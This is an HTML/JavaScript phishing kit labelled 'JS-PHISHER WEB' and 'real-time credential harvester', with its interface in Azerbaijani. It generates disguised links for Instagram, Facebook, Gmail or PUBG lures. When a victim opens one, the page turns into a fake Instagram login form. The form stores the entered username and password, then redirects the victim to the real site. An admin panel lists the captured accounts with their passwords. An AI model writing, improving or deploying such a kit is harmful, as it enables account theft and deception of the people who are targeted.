<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Analizer - Phish Gen</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&display=swap');
        
        :root {
            --bg: #0a0a0c;
            --primary: #ff3e3e;
            --neon: #00d9ff;
            --card: #15151a;
        }

        body {
            margin: 0; background: var(--bg); color: #fff;
            font-family: 'Fira Code', monospace; display: flex; flex-direction: column; align-items: center;
        }

        .container { width: 95%; max-width: 800px; padding: 20px; }

        /* HEADER */
        .header { text-align: center; padding: 40px 0; border-bottom: 1px solid #222; }
        .header h1 { color: var(--primary); letter-spacing: 5px; margin: 0; }

        /* GENERATOR SECTION */
        .gen-box {
            background: var(--card); padding: 25px; border-radius: 15px;
            margin-top: 30px; border: 1px solid #333;
        }

        input, select {
            width: 100%; padding: 15px; margin: 10px 0;
            background: #000; border: 1px solid #444; color: var(--neon);
            border-radius: 8px; font-family: inherit;
        }

        .btn {
            width: 100%; padding: 15px; background: var(--primary);
            color: #fff; border: none; border-radius: 8px;
            font-weight: bold; cursor: pointer; transition: 0.3s;
        }

        .btn:hover { background: #ff0000; box-shadow: 0 0 20px rgba(255, 62, 62, 0.4); }

        /* RESULT LINK */
        .link-output {
            background: #000; padding: 15px; border-radius: 8px;
            margin-top: 20px; display: none; border: 1px dashed var(--neon);
        }

        /* VICTIM LOGS */
        .logs { margin-top: 40px; width: 100%; }
        .log-card {
            background: #111; padding: 15px; border-radius: 10px;
            margin-bottom: 10px; border-left: 5px solid var(--primary);
            display: flex; justify-content: space-between;
        }

        .status-online { color: #00ff00; font-size: 12px; }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <h1>JS-PHISHER WEB</h1>
            <p style="opacity: 0.5;">REAL-TIME CREDENTIAL HARVESTER</p>
        </div>

        <div class="gen-box">
            <h3>1. Səhifəni Hazırla</h3>
            <select id="template">
                <option value="Instagram">Instagram Login</option>
                <option value="Facebook">Facebook Security</option>
                <option value="Gmail">Google Account</option>
                <option value="PUBG">PUBG Mobile UC Gift</option>
            </select>
            <input type="text" id="maskName" placeholder="Maskalanmış Link Adı (məs: free-uc-gift)">
            <button class="btn" onclick="generatePhish()">LİNKİ GENERASİYA ET</button>

            <div id="output" class="link-output">
                <small style="color: var(--neon);">Qurbana göndəriləcək URL:</small><br>
                <code id="finalUrl"></code>
            </div>
        </div>

        <div class="logs">
            <h3>2. Tutulan Hesablar <span class="status-online">● CANLI</span></h3>
            <div id="logList">
                <p style="opacity: 0.3; text-align: center;">Hələ ki, məlumat yoxdur...</p>
            </div>
        </div>
    </div>

    <script>
        // Link yaratma funksiyası
        function generatePhish() {
            const template = document.getElementById('template').value;
            const mask = document.getElementById('maskName').value || 'login';
            const output = document.getElementById('output');
            const finalUrl = document.getElementById('finalUrl');

            // Lokal URL-i yaradırıq (Serverdə olanda real link olacaq)
            const currentUrl = window.location.href.split('?')[0];
            const link = `${currentUrl}?target=${template}&ref=${mask}`;
            
            finalUrl.innerText = link;
            output.style.display = 'block';
        }

        // Qurban səhifəsini simulyasiya edən funksiya
        function checkVictimMode() {
            const params = new URLSearchParams(window.location.search);
            const target = params.get('target');

            if (target) {
                // Əgər linkə qurban giribsə, bütün saytı saxta loginə çevir
                document.body.innerHTML = `
                    <div style="background:#fff; color:#000; height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; font-family:sans-serif;">
                        <img src="https://www.instagram.com/static/images/web/mobile_gnl_header_2x.png/93083ad62171.png" width="175">
                        <form style="display:flex; flex-direction:column; width:300px; margin-top:20px;" onsubmit="handlePhish(event)">
                            <input type="text" id="u" placeholder="Phone, username or email" style="padding:10px; margin:5px; border:1px solid #dbdbdb; background:#fafafa;" required>
                            <input type="password" id="p" placeholder="Password" style="padding:10px; margin:5px; border:1px solid #dbdbdb; background:#fafafa;" required>
                            <button type="submit" style="background:#0095f6; color:#fff; border:none; padding:10px; margin:10px; border-radius:4px; font-weight:bold; cursor:pointer;">Log In</button>
                        </form>
                        <p style="color:#385185; font-weight:bold; font-size:14px;">Log in with Facebook</p>
                    </div>
                `;
            }
        }

        // Hesabı tutub bazaya yazan funksiya
        function handlePhish(e) {
            e.preventDefault();
            const user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;
            const target = new URLSearchParams(window.location.search).get('target');

            const log = {
                target: target,
                user: user,
                pass: pass,
                time: new Date().toLocaleTimeString()
            };

            // Baza (LocalStorage) - Realda Firebase və ya MySQL olar
            let db = JSON.parse(localStorage.getItem('logs') || "[]");
            db.push(log);
            localStorage.setItem('logs', JSON.stringify(db));

            // Qurbanı real sayta atırıq
            window.location.href = "https://instagram.com";
        }

        // Admin üçün loqları göstərən funksiya
        function updateLogs() {
            const list = document.getElementById('logList');
            const db = JSON.parse(localStorage.getItem('logs') || "[]");

            if (db.length > 0 && list) {
                list.innerHTML = db.reverse().map(item => `
                    <div class="log-card">
                        <div>
                            <b style="color:var(--neon)">[${item.target}]</b> ${item.user}<br>
                            <span style="color:#ff3e3e">Şifrə: ${item.pass}</span>
                        </div>
                        <div style="font-size:10px; opacity:0.5">${item.time}</div>
                    </div>
                `).join('');
            }
        }

        // Başlat
        checkVictimMode();
        setInterval(updateLogs, 2000);
    </script>
</body>
</html>
